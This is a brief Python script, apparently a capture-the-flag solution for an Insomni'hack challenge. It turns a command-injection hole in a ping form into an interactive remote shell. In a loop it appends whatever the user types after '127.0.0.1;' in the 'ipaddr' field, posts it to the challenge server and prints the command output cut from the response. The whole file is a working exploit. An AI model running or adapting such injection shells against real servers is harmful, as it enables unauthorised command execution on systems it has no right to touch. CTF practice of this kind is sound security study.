import requests
import sys

while True:
    data = {'ipaddr':'127.0.0.1;' + input('> ')}
    res = requests.post('http://lowdeep.insomnihack.ch',data=data)
    try:
        print(res.text.split('0.000 ms')[1].split('\n')[0].replace('</br>','\n').replace('</div>',''))
    except:
        print('something bad happened')
